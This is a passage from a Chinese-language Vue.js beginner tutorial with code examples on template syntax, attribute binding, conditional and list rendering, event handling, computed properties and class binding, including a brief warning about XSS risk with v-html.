class="line">      count: 0</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line"></span><br><span class="line">  // methods 是一些用来更改状态与触发更新的函数</span><br><span class="line">  // 它们可以在模板中作为事件处理器绑定</span><br><span class="line">  methods: &#123;</span><br><span class="line">    increment() &#123;</span><br><span class="line">      this.count++</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line"></span><br><span class="line">  // 生命周期钩子会在组件生命周期的各个不同阶段被调用</span><br><span class="line">  // 例如这个函数就会在组件挂载完成后被调用</span><br><span class="line">  mounted() &#123;</span><br><span class="line">    console.log(`选项式API：The initial count is $&#123;this.count&#125;.`)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;button @click=&quot;increment&quot;&gt;选项式API：Count is: &#123;&#123; count &#125;&#125;&lt;/button&gt;</span><br><span class="line">&lt;/template&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script setup&gt;</span><br><span class="line">// 组合式API</span><br><span class="line">import &#123; ref, onMounted &#125; from &#x27;vue&#x27;</span><br><span class="line"></span><br><span class="line">// 响应式状态</span><br><span class="line">const count = ref(0)</span><br><span class="line"></span><br><span class="line">// 用来修改状态、触发更新的函数</span><br><span class="line">function increment() &#123;</span><br><span class="line">  count.value++</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 生命周期钩子</span><br><span class="line">onMounted(() =&gt; &#123;</span><br><span class="line">  console.log(`组合式API：The initial count is $&#123;count.value&#125;.`)</span><br><span class="line">&#125;)</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;button @click=&quot;increment&quot;&gt;组合式API：Count is: &#123;&#123; count &#125;&#125;&lt;/button&gt;</span><br><span class="line">&lt;/template&gt;</span><br></pre></td></tr></table></figure><hr><h2 id="二、Vue基础"><a href="#二、Vue基础" class="headerlink" title="二、Vue基础"></a>二、Vue基础</h2><blockquote><p>下列写法都是选项式写法。</p></blockquote><h3 id="1-文本插值"><a href="#1-文本插值" class="headerlink" title="1 文本插值"></a>1 文本插值</h3><blockquote><p>script中的值会在template中直接显示出来。</p><p>每个绑定仅支持单一表达式，也就是一段能够被求值的JavaScript代码。一个简单的判断方法是是否可以合法地写在return后面。</p><p>注：在网站上动态渲染任意 HTML 是非常危险的，因为这非常容易造成XSS 漏洞。请仅在内容安全可信时再使用 <code>v-html</code>，并且<strong>永远不要</strong>使用用户提供的 HTML 内容。</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">&lt;h3&gt;模板语法&lt;/h3&gt;</span><br><span class="line">&lt;p&gt;&#123;&#123; msg &#125;&#125;&lt;/p&gt;</span><br><span class="line">&lt;p&gt;&#123;&#123; hello &#125;&#125;&lt;/p&gt;</span><br><span class="line">&lt;p&gt;&#123;&#123; number + 1 &#125;&#125;&lt;/p&gt;</span><br><span class="line">&lt;p&gt;&#123;&#123; ok ? &#x27;YES&#x27; : &#x27;NO&#x27; &#125;&#125;&lt;/p&gt;</span><br><span class="line">&lt;p&gt;&#123;&#123; message.split(&#x27;&#x27;).reverse().join(&#x27;&#x27;) &#125;&#125;&lt;/p&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">export default&#123;</span><br><span class="line">    data()&#123;</span><br><span class="line">return &#123;</span><br><span class="line">            msg:&quot;神奇的语法&quot;,</span><br><span class="line">            hello:&quot;Hello World!&quot;,</span><br><span class="line">            number:10,</span><br><span class="line">            ok:true,</span><br><span class="line">            message:&quot;大家好&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- 下列是无效语句 --&gt;</span><br><span class="line">&lt;!-- 这是一个语句，而非表达式 --&gt;</span><br><span class="line">&#123;&#123; var a = 1 &#125;&#125;</span><br><span class="line"></span><br><span class="line">&lt;!-- 条件控制也不支持，请使用三元表达式 --&gt;</span><br><span class="line">&#123;&#123; if (ok) &#123; return message &#125; &#125;&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!-- 链接解析 --&gt;</span><br><span class="line">&lt;template&gt;</span><br><span class="line">&lt;p&gt;&#123;&#123; rawHtml &#125;&#125;&lt;/p&gt; &lt;!-- 原样输出链接 --&gt;</span><br><span class="line">&lt;p v-html=&quot;rawHtml&quot;&gt;&lt;/p&gt; &lt;!-- 解析后嵌套在p标签内 --&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">export default&#123;</span><br><span class="line">    data()&#123;</span><br><span class="line">return &#123;</span><br><span class="line">            rawHtml:&quot;&lt;a href=&#x27;https://itbaizhan.com&#x27;&gt;百战程序员&lt;/a&gt;&quot;,</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><h3 id="2-属性绑定"><a href="#2-属性绑定" class="headerlink" title="2 属性绑定"></a>2 属性绑定</h3><blockquote><p>双大括号不能在 HTML attributes 中使用。想要响应式地绑定一个attribute，应该使用<code>v-bind</code>指令。</p><p><code>v-bind</code>指令指示Vue将元素的<code>id</code>attribute 与组件的<code>dynamicld</code>属性保持一致。如果绑定的值是<code>null</code>或者<code>undefined</code>，那么该attribute将会从渲染的元素上移除。</p><p>因为<code>v-bind</code>非常常用，所以有简写语法，直接写个冒号即可。</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">&lt;div class=&quot;&#123;&#123; msg &#125;&#125;&quot;&gt;测试&lt;/div&gt; &lt;!-- class的值原样输出 --&gt;</span><br><span class="line">&lt;div v-bind:id=&quot;dynamicId&quot; v-bind:class=&quot;msg&quot;&gt;测试&lt;/div&gt; &lt;!-- 属性值转化后输出 --&gt;</span><br><span class="line">&lt;div v-bind:id=&quot;isNull&quot; v-bind:class=&quot;isUndefined&quot;&gt;测试&lt;/div&gt; &lt;!-- 属性值都被移除 --&gt;</span><br><span class="line">&lt;div :id=&quot;dynamicId&quot; :class=&quot;msg&quot;&gt;测试&lt;/div&gt; &lt;!-- 简写语法 --&gt;</span><br><span class="line">&lt;button :disabled=&quot;isButtonDisabled&quot;&gt;不可点击&lt;/button&gt; &lt;!-- 可以动态改变按钮 --&gt;</span><br><span class="line">&lt;div v-bind=&quot;objectOfAttrs&quot;&gt;测试&lt;/div&gt; &lt;!-- 一次绑定多个值 --&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">export default&#123;</span><br><span class="line">    data()&#123;</span><br><span class="line">return &#123;</span><br><span class="line">            msg:&quot;active&quot;,</span><br><span class="line">            dynamicId:&quot;appid&quot;,</span><br><span class="line">            isNull:null,</span><br><span class="line">            isUndefined:undefined,</span><br><span class="line">            isButtonDisabled:true,</span><br><span class="line">            objectOfAttrs:&#123;</span><br><span class="line">                id: &quot;appId&quot;,  // 属性名:&quot;属性值&quot;，可以自定义 </span><br><span class="line">                class: &quot;appClass&quot;,</span><br><span class="line">                myAttr: &quot;attr&quot;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- css会对类值为active的类生效 --&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">    .active&#123;</span><br><span class="line">color: red;</span><br><span class="line">    font-size: 30px;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure><h3 id="3-条件渲染"><a href="#3-条件渲染" class="headerlink" title="3 条件渲染"></a>3 条件渲染</h3><blockquote><p><code>v-if，v-else-if，v-else</code>：为真则渲染，否则不渲染。</p><p><code>v-show</code>类似<code>v-if</code>，也是条件判断，但是<code>v-show</code>后面不可接else。</p><p><code>v-if</code>和<code>v-show</code>：</p><ul><li><code>v-if</code>是“真实的”按条件渲染，因为它确保了在切换时，条件区块内的事件监听器和子组件都会被销毁与重建。</li><li><code>v-if</code>也是惰性的：如果在初次渲染时条件值为false，则不会做任何事。条件区块只有当条件首次变为true时才被渲染。</li><li>相比之下，<code>v-show</code>简单许多，元素无论初始条件如何，始终会被渲染，只有CSS <code>display</code>属性会被切换。</li><li>总的来说，<code>v-if</code>有更高的切换开销，而<code>v-show</code>有更高的初始渲染开销。因此，如果需要频繁切换，则使用<code>v-show</code>较好；如果在运行时绑定条件很少改变，则<code>v-if</code>会更合适。</li></ul></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">&lt;div v-if=&quot;flag&quot;&gt;can you see me?&lt;/div&gt; &lt;!-- 修改flag的值看不同结果 --&gt;</span><br><span class="line">&lt;div v-else&gt;You should see me.&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">&lt;div v-if=&quot;type === &#x27;A&#x27;&quot;&gt;A&lt;/div&gt; &lt;!-- 修改type的值看不同结果 --&gt;</span><br><span class="line">&lt;div v-else-if=&quot;type === &#x27;B&#x27;&quot;&gt;B&lt;/div&gt;</span><br><span class="line">&lt;div v-else-if=&quot;type === &#x27;C&#x27;&quot;&gt;C&lt;/div&gt;</span><br><span class="line">&lt;div v-else&gt;Not A/B/C&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">&lt;div v-show=&quot;flag&quot;&gt;show!&lt;/div&gt; &lt;!-- 修改flag的值看不同结果 --&gt;</span><br><span class="line">&lt;div v-else&gt;No show!&lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">export default&#123;</span><br><span class="line">    data()&#123;</span><br><span class="line">return &#123;</span><br><span class="line">            flag:true,</span><br><span class="line">            type:&quot;D&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><h3 id="4-列表渲染"><a href="#4-列表渲染" class="headerlink" title="4 列表渲染"></a>4 列表渲染</h3><blockquote><p>我们可以使用<code>v-for</code>指令基于一个数组来渲染一个列表。<code>v-for</code>指令的值需要使用<code>item in items</code>形式的特殊语法，其中<code>items</code>是源数据的数组，而<code>item</code>是迭代项的别名。</p><p>列表有如下：</p><ul><li><code>&lt;p v-for=&quot;item in names&quot;&gt;</code>：依次获取names中的值存到item中。</li><li><code>&lt;p v-for=&quot;item of names&quot;&gt;</code>：同理，用of也行。</li><li><code>&lt;p v-for=&quot;(item,index) in names&quot;&gt;</code>：依次获取names中的值存到item中，获得下标存入index中。</li><li><code>&lt;p v-for=&quot;(item,index) of names&quot;&gt;</code>：同理。</li></ul><p>对象有如下：</p><ul><li><code>&lt;p v-for=&quot;(value,key,index) in userInfo&quot;&gt;</code>：依次获得值，键，下标。</li></ul></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">    &lt;div v-for=&quot;item in names&quot;&gt;&#123;&#123; item &#125;&#125;&lt;/div&gt;</span><br><span class="line">&lt;!-- 获得列表中对象值 --&gt;</span><br><span class="line">    &lt;div v-for=&quot;item in result&quot;&gt;</span><br><span class="line">        &lt;p&gt;&#123;&#123; item.title &#125;&#125;&lt;/p&gt;</span><br><span class="line">        &lt;img :src=&quot;item.avator&quot; alt=&quot;&quot; /&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;!-- 获得对象值 --&gt;</span><br><span class="line">&lt;p v-for=&quot;(value,key,index) in userInfo&quot;&gt;&#123;&#123; value &#125;&#125; - &#123;&#123; key &#125;&#125; - &#123;&#123; index &#125;&#125;&lt;/p&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">export default &#123;</span><br><span class="line">    data() &#123;</span><br><span class="line">        return &#123;</span><br><span class="line">            names: [&quot;uyi&quot;, &quot;mio&quot;, &quot;tsumugi&quot;],</span><br><span class="line">            result: [</span><br><span class="line">                &#123;</span><br><span class="line">                    id: 1,</span><br><span class="line">                    title: &#x27;百度&#x27;,</span><br><span class="line">                    avator: &#x27;https://www.baidu.com/img/flexible/logo/pc/peak-result.png&#x27;</span><br><span class="line">                &#125;,</span><br><span class="line">                &#123;</span><br><span class="line">                    id: 2,</span><br><span class="line">                    title: &#x27;淘宝&#x27;,</span><br><span class="line">                    avator: &#x27;https://gw.alicdn.com/mt/TB1ZnvPLFXXXXa3XFXXXXXXXXXX-63-63.png&#x27;</span><br><span class="line">                &#125;</span><br><span class="line">            ],</span><br><span class="line">            userInfo: &#123;</span><br><span class="line">                name: &quot;ikun&quot;,</span><br><span class="line">                age: 24,</span><br><span class="line">                sex: &quot;man&quot;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><h3 id="5-Key管理"><a href="#5-Key管理" class="headerlink" title="5 Key管理"></a>5 Key管理</h3><blockquote><p>Vue默认按照”就地更新”的策略来更新通过<code>v-for</code>渲染的元素列表。当数据项的顺序改变时，Vue不会随之移动DOM元素的顺序，而是就地更新每个元素，确保它们在原本指定的索引位置上渲染。</p><p>比如原始数据顺序是：1、2、3。当改成：1、3、2后，Vue不会仅仅改变两者的顺序，而是连带所有数据全部重新渲染，这样十分消耗性能。</p><p>为了给Vue一个提示，以便它可以跟踪每个节点的标识，从而重用和重新排序现有的元素，你需要为每个元素对应的块提供一个唯一的<code>key attribute</code>。</p><p>温馨提示：</p><ul><li><code>key</code>在这里是一个通过<code>v-bind</code>绑定的特殊<code>attribute</code></li><li>推荐在任何可行的时候为<code>v-for</code>提供一个<code>key attribute</code></li><li><code>key</code>绑定的值期望是一个基础类型的值，例如字符串或number类型</li><li>不建议使用<code>index</code>作为<code>key</code>的值，因为<code>index</code>是会随数组改变而改变，我们要确保每一条数据的唯一索引不会改变，可以使用数据库中返回的<code>id</code>作为索引。</li></ul></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">&lt;!-- 用id作为唯一key --&gt;</span><br><span class="line">    &lt;div v-for=&quot;(item,index) in result&quot; :key=&quot;item.id&quot;&gt;</span><br><span class="line">        &lt;p&gt;&#123;&#123; item.title &#125;&#125;&lt;/p&gt;</span><br><span class="line">        &lt;img :src=&quot;item.avator&quot; alt=&quot;&quot; /&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">export default &#123;</span><br><span class="line">    data() &#123;</span><br><span class="line">        return &#123;</span><br><span class="line">            result: [</span><br><span class="line">                &#123;</span><br><span class="line">                    id: 1,</span><br><span class="line">                    title: &#x27;百度&#x27;,</span><br><span class="line">                    avator: &#x27;https://www.baidu.com/img/flexible/logo/pc/peak-result.png&#x27;</span><br><span class="line">                &#125;,</span><br><span class="line">                &#123;</span><br><span class="line">                    id: 2,</span><br><span class="line">                    title: &#x27;淘宝&#x27;,</span><br><span class="line">                    avator: &#x27;https://gw.alicdn.com/mt/TB1ZnvPLFXXXXa3XFXXXXXXXXXX-63-63.png&#x27;</span><br><span class="line">                &#125;</span><br><span class="line">            ]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><h3 id="6-事件管理"><a href="#6-事件管理" class="headerlink" title="6 事件管理"></a>6 事件管理</h3><blockquote><p>我们可以使用<code>v-on</code>指令（简写为<code>@</code>）来监听DOM事件，并在事件触发时执行对应的JavaScript。用法：<code>v-on:click=&quot;methodName&quot;</code>或<code>@click=&quot;handler&quot;</code></p><p>事件处理器的值可以是：</p><ol><li>内联事件处理器：事件被触发时执行的内联JavaScript语句（与<code>onclick</code>类似）。通常用于简单场景。</li><li>方法事件处理器：一个指向组件上定义的方法的属性名或是路径。</li></ol></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!-- 内联事件处理器 --&gt;</span><br><span class="line">&lt;template&gt;</span><br><span class="line">&lt;h3&gt;内联事件处理器&lt;/h3&gt;</span><br><span class="line">&lt;button @click=&quot;count++&quot;&gt;Inline add 1&lt;/button&gt;</span><br><span class="line">&lt;p&gt;Count is: &#123;&#123; count &#125;&#125;&lt;/p&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">export default &#123;</span><br><span class="line">    data() &#123;</span><br><span class="line">        return &#123;</span><br><span class="line">          count: 0</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;!-- 方法事件处理器 --&gt;</span><br><span class="line">&lt;template&gt;</span><br><span class="line">&lt;h3&gt;方法事件处理器&lt;/h3&gt;</span><br><span class="line">&lt;button @click=&quot;addCount&quot;&gt;Method add 1&lt;/button&gt;</span><br><span class="line">&lt;p&gt;Count is: &#123;&#123; count &#125;&#125;&lt;/p&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">export default &#123;</span><br><span class="line">    data() &#123;</span><br><span class="line">        return &#123;</span><br><span class="line">          count: 0</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    // 所有的方法或者函数都放在这里</span><br><span class="line">    methods:&#123;</span><br><span class="line">        addCount()&#123;</span><br><span class="line">            this.count++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><h3 id="7-事件传参"><a href="#7-事件传参" class="headerlink" title="7 事件传参"></a>7 事件传参</h3><blockquote><p>事件参数可以获取<code>event</code>对象和通过事件传递数据。</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">&lt;!-- 无参传递事件 --&gt;</span><br><span class="line">&lt;button @click=&quot;addCount&quot;&gt;Add&lt;/button&gt;</span><br><span class="line">&lt;p&gt;&#123;&#123; count &#125;&#125;&lt;/p&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- 有参传递事件 --&gt;</span><br><span class="line">&lt;p @click=&quot;getNameHandler($event,item)&quot; v-for=&quot;(item,index) of names&quot; :key=&quot;index&quot;&gt;&#123;&#123; item &#125;&#125;&lt;/p&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">export default &#123;</span><br><span class="line">    data() &#123;</span><br><span class="line">        return &#123;</span><br><span class="line">          count: 0,</span><br><span class="line">            names: [&quot;uyi&quot;,&quot;mio&quot;,&quot;tsumugi&quot;]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    methods:&#123;</span><br><span class="line">        // 无参可以直接获得e</span><br><span class="line">        addCount(e)&#123;</span><br><span class="line">            // 控制台输出</span><br><span class="line">            console.log(e.target.innerHTML = &quot;A&quot;);</span><br><span class="line">            this.count++;</span><br><span class="line">        &#125;,</span><br><span class="line">        // 带参获得事件（点击名字可以输出对应结果）</span><br><span class="line">        getNameHandler(e,name)</span><br><span class="line">        &#123;</span><br><span class="line">console.log(name);</span><br><span class="line">            console.log(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><h3 id="8-事件修饰符"><a href="#8-事件修饰符" class="headerlink" title="8 事件修饰符"></a>8 事件修饰符</h3><blockquote><p>在处理事件时调用<code>event.preventDefault()</code>或<code>event.stopPropagation()</code>是很常见的。尽管我们可以直接在方法内调用，但如果方法能更专注于数据逻辑而不用去处理DOM事件的细节会更好。</p><p><a href="https://cn.vuejs.org/guide/essentials/event-handling.html#event-modifiers">official::更多修饰符</a></p><p>因此Vue为<code>v-on</code>提供了事件修饰符，常见如下：</p><ul><li><code>.stop</code>：阻止事件冒泡</li><li><code>.prevent</code>：阻止默认事件</li><li><code>.once</code>：事件只会被触发一次</li><li><code>.enter</code>：回车事件触发的</li></ul></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">&lt;h3&gt;点击但不跳转&lt;/h3&gt;</span><br><span class="line">&lt;a @click.prevent=&quot;clickHandle&quot; href=&quot;https://www.baidu.com&quot;&gt;百度&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">&lt;h3&gt;父元素不冒泡&lt;/h3&gt;</span><br><span class="line">&lt;!-- 阻止子元素向上冒泡到父元素 --&gt;</span><br><span class="line">&lt;div @click=&quot;clickDiv&quot;&gt;</span><br><span class="line">    &lt;p @click.stop=&quot;clickP&quot;&gt;测试冒泡&lt;/p&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">export default &#123;</span><br><span class="line">    data() &#123;</span><br><span class="line">        return &#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    methods:&#123;</span><br><span class="line">        clickHandle(e)&#123;</span><br><span class="line">            console.log(&quot;被点了喵&quot;);</span><br><span class="line">        &#125;,</span><br><span class="line">        clickDiv()&#123;</span><br><span class="line">            console.log(&quot;div被点了喵&quot;);</span><br><span class="line">        &#125;,</span><br><span class="line">        clickP()&#123;</span><br><span class="line">            console.log(&quot;P被点了喵&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><h3 id="9-数组侦测"><a href="#9-数组侦测" class="headerlink" title="9 数组侦测"></a>9 数组侦测</h3><blockquote><p>变更方法：</p><ul><li>Vue能够侦听响应式数组的变更方法，并在它们被调用时触发相关的更新。这些变更方法包括：<code>push()、pop()、shift()、unshift()、splice()、sort()、reverse()</code></li></ul><p>替换一个数组：</p><ul><li>变更方法，顾名思义，就是会对调用它们的原数组进行变更。相对地，也有一些不可变(immutable)方法，例如<code>flter()</code>，<code>concat()</code>和<code>slice()</code>，这些都不会更改原数组，而总是返回一个新数组。当遇到的是非变更方法时，我们需要将旧的数组替换为新的</li></ul></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">&lt;!-- 数组变化帧听 --&gt;</span><br><span class="line">&lt;button @click=&quot;addListHandle&quot;&gt;添加数据&lt;/button&gt;</span><br><span class="line">&lt;ul&gt;</span><br><span class="line">        &lt;li v-for=&quot;(item,index) of names&quot; :key=&quot;index&quot;&gt;&#123;&#123; item &#125;&#125;&lt;/li&gt;</span><br><span class="line">    &lt;/ul&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- 合并数组 --&gt;</span><br><span class="line">&lt;button @click=&quot;concatHandle&quot;&gt;合并数组&lt;/button&gt;</span><br><span class="line">&lt;h3&gt;数组1&lt;/h3&gt;</span><br><span class="line">&lt;p v-for=&quot;(item,index) of nums1&quot; :key=&quot;index&quot;&gt;&#123;&#123; item &#125;&#125;&lt;/p&gt;</span><br><span class="line">&lt;h3&gt;数组2&lt;/h3&gt;</span><br><span class="line">&lt;p v-for=&quot;(item,index) of nums2&quot; :key=&quot;index&quot;&gt;&#123;&#123; item &#125;&#125;&lt;/p&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">export default &#123;</span><br><span class="line">    data() &#123;</span><br><span class="line">        return &#123;</span><br><span class="line">            names: [&quot;uyi&quot;,&quot;mio&quot;,&quot;tsumugi&quot;],</span><br><span class="line">            nums1: [1,2,3,4,5],</span><br><span class="line">            nums2: [6,7,8,9,10]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    methods:&#123;</span><br><span class="line">        addListHandle()&#123;</span><br><span class="line">        // UI会自动更新</span><br><span class="line">            // this.names.push(&quot;azi&quot;);</span><br><span class="line">           // console.log(this.names);</span><br><span class="line">           </span><br><span class="line">            // 不会引起UI自动更新</span><br><span class="line">            this.names.concat([&quot;azi&quot;]);</span><br><span class="line">            console.log(this.names.concat([&quot;azi&quot;]));</span><br><span class="line"></span><br><span class="line">// 重新赋值更新UI</span><br><span class="line">// this.names = this.names.concat([&quot;azi&quot;]);</span><br><span class="line">// console.log(this.names);</span><br><span class="line">        &#125;,</span><br><span class="line">       concatHandle()&#123;</span><br><span class="line">           // 同理上面</span><br><span class="line">           this.nums1 = this.nums1.concat(this.nums2);</span><br><span class="line">       &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><h3 id="10-计算属性"><a href="#10-计算属性" class="headerlink" title="10 计算属性"></a>10 计算属性</h3><blockquote><p>模板中的表达式虽然方便，但也只能用来做简单的操作。如果在模板中写太多逻辑，会让模板变得臃肿，难以维护。因此我们推荐使用计算属性来描述依赖响应式状态的复杂逻辑。</p><p>重点区别:</p><ul><li><p>计算属性：计算属性值会基于其响应式依赖被缓存。一个计算属性仅会在其响应式依赖更新时才重新计算。</p></li><li><p>方法：方法调用总是会在重渲染发生时再次执行函数。</p></li></ul></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">&lt;h3&gt;&#123;&#123; itbaizhan.name &#125;&#125;&lt;/h3&gt;</span><br><span class="line">&lt;!-- 计算属性仅计算一次，不加括号 --&gt;</span><br><span class="line">&lt;p&gt;&#123;&#123; itbaizhanContent &#125;&#125;&lt;/p&gt;</span><br><span class="line">    &lt;p&gt;&#123;&#123; itbaizhanContent &#125;&#125;&lt;/p&gt;</span><br><span class="line">    &lt;p&gt;&#123;&#123; itbaizhanContent &#125;&#125;&lt;/p&gt;</span><br><span class="line">    &lt;p&gt;&#123;&#123; itbaizhanContent &#125;&#125;&lt;/p&gt;</span><br><span class="line">&lt;!-- 函数会被调用四次 --&gt;</span><br><span class="line">    &lt;p&gt;&#123;&#123; itbaizhanContents() &#125;&#125;&lt;/p&gt;</span><br><span class="line">    &lt;p&gt;&#123;&#123; itbaizhanContents() &#125;&#125;&lt;/p&gt;</span><br><span class="line">    &lt;p&gt;&#123;&#123; itbaizhanContents() &#125;&#125;&lt;/p&gt;</span><br><span class="line">    &lt;p&gt;&#123;&#123; itbaizhanContents() &#125;&#125;&lt;/p&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">export default &#123;</span><br><span class="line">    data() &#123;</span><br><span class="line">        return &#123;</span><br><span class="line">            itbaizhan:&#123;</span><br><span class="line">                name: &quot;百战程序员&quot;,</span><br><span class="line">                content: [&quot;前端&quot;,&quot;Java&quot;,&quot;Python&quot;]</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    // 计算属性</span><br><span class="line">    computed:&#123;</span><br><span class="line">        itbaizhanContent()&#123;</span><br><span class="line">            return this.itbaizhan.content.length &gt; 0 ? &quot;Yes&quot;: &quot;No&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    // 方法</span><br><span class="line">    methods:&#123;</span><br><span class="line">        itbaizhanContents()&#123;</span><br><span class="line">            return this.itbaizhan.content.length &gt; 0 ? &quot;Yes&quot;: &quot;No&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><h3 id="11-Class绑定"><a href="#11-Class绑定" class="headerlink" title="11 Class绑定"></a>11 Class绑定</h3><blockquote><p>数据绑定的一个常见需求场景是操纵元素的<code>CSS class</code>列表，因为<code>class</code>是<code>attribute</code>，我们可以和其他<code>attribute</code>一样使用<code>v-bind</code> 将它们和动态的字符串绑定。但是，在处理比较复杂的绑定时，通过拼接生成字符串是麻烦且易出错的。因此，Vue专门为<code>class</code>的<code>v-bind</code>用法提供了特殊的功能增强。除了字符串外，表达式的值也可以是对象或数组。</p><p>在数组中也可以有条件地渲染某个class，使用三元表达式即可。</p><p>数组中也可以嵌套对象，但是对象中不能嵌套数组。</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">&lt;p :class=&quot;&#123;&#x27;active&#x27;: isActive,&#x27;text-danger&#x27;: hasError&#125;&quot;&gt;Class样式绑定1&lt;/p&gt;</span><br><span class="line">&lt;!-- 可以直接绑定一个类 --&gt;</span><br><span class="line">&lt;p :class=&quot;classObject&quot;&gt;Class样式绑定2&lt;/p&gt;</span><br><span class="line">&lt;!-- 可以绑定一个数组 --&gt;</span><br><span class="line">&lt;p :class=&quot;[arrActive,arrHasError]&quot;&gt;Class样式绑定3&lt;/p&gt;</span><br><span class="line">&lt;!-- 有条件绑定 --&gt;</span><br><span class="line">&lt;p :class=&quot;[isActive ? &#x27;active text-danger&#x27; : 